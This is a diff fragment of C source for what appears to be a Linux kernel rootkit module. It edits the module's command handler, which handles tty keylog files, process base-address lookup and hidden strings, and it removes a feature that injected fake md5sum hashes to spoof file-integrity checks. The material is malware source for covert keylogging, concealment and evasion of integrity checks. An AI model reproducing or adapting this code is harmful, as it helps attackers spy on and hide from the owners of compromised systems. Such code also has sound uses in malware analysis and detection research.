@@ -567,32 +567,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
         /* unset tty log file to be removed on rmmod */
         } else if (!strcmp(buf, "-t1")) {
                 kv_keylog_rm_log(false);
-        /* set md5 log file to be removed on rmmod */
-        } else if (!strcmp(buf, "-m0")) {
-                kv_md5log_rm_log(true);
-        /* unset md5 log file to be removed on rmmod */
-        } else if (!strcmp(buf, "-m1")) {
-                kv_md5log_rm_log(false);
-                /* add fake md5sum hash */
-        } else if(!strncmp(buf, "-m", MIN(2, size))) {
-            char fake[MD5LEN+1] = {0};
-            char orig[MD5LEN+1] = {0};
-            /** point to string after -md5 */
-            char *md5 = &buf[3];
-
-            memcpy(fake, md5, MD5LEN);
-            memcpy(orig, &md5[MD5LEN+1], MD5LEN);
-
-            if (!kv_whatever_is_md5(fake, MD5LEN))
-                goto prctime;
-            if (!kv_whatever_is_md5(orig, MD5LEN))
-                goto prctime;
-
-            if (!kv_md5_add_hashes(fake, orig, true)) {
-                prerr("Failed to add hashes\n");
-            } else {
-                prinfo("added: %s %s\n", fake, orig);
-            }
         /* fetch base address of process */
         } else if (!strncmp(buf, "-b", MIN(2, size))) {
             char *tmp = &buf[3];
@@ -911,7 +885,6 @@ static void __exit kv_cleanup(void) {
     }
 
     fs_names_cleanup();
-    kv_md5_show_hashes();
 
     if ((hiddenstr = kv_get_hidden_string()))
         kfree(hiddenstr);
